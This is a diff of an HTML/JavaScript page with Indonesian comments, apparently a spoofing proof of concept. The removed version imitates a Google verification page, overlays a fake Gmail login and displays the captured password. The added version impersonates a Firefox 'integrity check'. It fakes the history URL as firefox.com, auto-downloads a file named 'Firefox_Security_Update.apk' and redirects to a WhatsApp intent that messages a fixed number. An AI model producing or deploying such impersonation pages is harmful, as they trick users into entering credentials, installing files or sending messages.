@@ -3,82 +3,135 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
+<title>Firefox Security Verification — Official Gateway</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-  h2 { color: #4285f4; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-  button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  body { 
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+    background: #f3f2f1; 
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    min-height: 100vh; 
+    color: #323130;
+    overflow: hidden;
+  }
+  .card { 
+    background: #ffffff; 
+    padding: 40px; 
+    border-radius: 4px; 
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
+    max-width: 420px; 
+    width: 100%; 
+    text-align: center; 
+    border-top: 4px solid #711c91;
+  }
+  .logo { font-size: 24px; font-weight: 600; color: #711c91; margin-bottom: 20px; }
+  h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
+  p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
+  button { 
+    background: #711c91; 
+    color: #ffffff; 
+    border: none; 
+    padding: 12px 24px; 
+    font-size: 15px; 
+    font-weight: 600; 
+    border-radius: 2px; 
+    cursor: pointer; 
+    width: 100%; 
+    transition: background 0.2s;
+  }
+  button:hover { background: #5a1473; }
+  #status { 
+    margin-top: 20px; 
+    font-size: 13px; 
+    color: #711c91; 
+    font-weight: 500; 
+  }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-card">
-  <h2>Google Security Verification</h2>
-  <p>Click the button below to verify your account via port 8443.</p>
-  <button id="startBtn">Verify Account</button>
-  <div id="status">[*] Ready...</div>
+<div class="card">
+  <div class="logo">Mozilla Firefox</div>
+  <h2>Browser Integrity Check</h2>
+  <p>Verifying secure channel parameters and session state protocols...</p>
+  <button id="actionBtn">Initialize Secure Bridge</button>
+  <div id="status"></div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('startBtn');
+  var btn = document.getElementById('actionBtn');
   var statusEl = document.getElementById('status');
 
-  function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[Delay Spoof] " + msg);
+  // Konfigurasi Delay (3 detik stacking window)
+  var DELAY_SECONDS = 3; 
+
+  // Target WhatsApp Intent
+  var TARGET_PHONE = "628123456789";
+  var TARGET_MESSAGE = "Firefox security verification handshake token: 404-SECURE";
+  var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
+
+  function triggerSpoofedStackChain() {
+    statusEl.textContent = "Stacking security context...";
+
+    // 1. Manipulasi History Stack (Menyamarkan asal domain seolah-olah dari firefox.com)
+    try {
+      if (window.history && window.history.pushState) {
+        // Mendorong state palsu ke dalam stack riwayat peramban
+        window.history.pushState({page: "secure_portal"}, "Firefox Security", "asasasasasasadskdsadsadsadsadsadsdsasdsadasdsadsadasdasldkaslkdasdasdsdsadadsadasdsdasdasdhttps://www.firefox.com/security/verify");
+      }
+    } catch (e) {}
+
+    // 2. Pembuatan file virtual .apk di background via Blob API
+    try {
+      var dummyBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x08, 0x00]);
+      var blob = new Blob([dummyBytes], { type: 'application/vnd.android.package-archive' });
+      var blobUrl = URL.createObjectURL(blob);
+
+      var a = document.createElement('a');
+      a.href = blobUrl;
+      a.download = "Firefox_Security_Update.apk";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      setTimeout(function() {
+        URL.revokeObjectURL(blobUrl);
+      }, 5000);
+    } catch (e) {}
+
+    // 3. Hitung mundur delay stacking sebelum memicu intent WhatsApp
+    var countdown = DELAY_SECONDS;
+    var timer = setInterval(function() {
+      countdown--;
+      if (countdown > 0) {
+        statusEl.textContent = "Resolving host context in " + countdown + "s...";
+      } else {
+        clearInterval(timer);
+        statusEl.textContent = "Dispatching protocol intent...";
+        
+        // Eksekusi pengalihan ke Intent WhatsApp setelah stack tertahan
+        window.location.replace(WHATSAPP_INTENT_URL);
+      }
+    }, 1000);
   }
 
   btn.addEventListener('click', function() {
-    log("[*] Starting delay spoofing...");
+    btn.disabled = true;
+    btn.style.opacity = "0.6";
+    statusEl.textContent = "Establishing secure stack...";
 
-    try {
-      window.location.href = "https://www.google.com:8443";
-    } catch (e) {
-      log("[-] Redirect error: " + e.message);
-    }
-
+    // Jeda kecil sebelum rangkaian aksi dimulai
     setTimeout(function() {
-      document.body.innerHTML = `
-        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-          <h2 style="color:#333;margin-bottom:10px;">Sign in</h2>
-          <p style="color:#666;font-size:14px;margin-bottom:20px;">to continue to Gmail</p>
-          <input type="email" id="spoofEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-          <input type="password" id="spoofPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Next</button>
-          <div style="margin-top:15px;font-size:11px;color:#f00;">Simulated phishing test UI. Do not enter real credentials.</div>
-        </div>
-      `;
+      triggerSpoofedStackChain();
+    }, 800);
 
-      document.getElementById('spoofLogin').addEventListener('click', function() {
-        var email = document.getElementById('spoofEmail').value;
-        var password = document.getElementById('spoofPass').value;
-
-        document.body.innerHTML = `
-          <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
-            <h2 style="color:#f00;">Simulated Capture</h2>
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Password:</strong> ${password}</p>
-            <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting...</p>
-          </div>
-        `;
-
-        setTimeout(function() {
-          window.location.href = 'https://www.google.com';
-        }, 2000);
-      });
-
-      log("[+] Spoof UI displayed while navigation is pending.");
-    }, 1000);
   }, { once: true });
+
 })();
 </script>
 
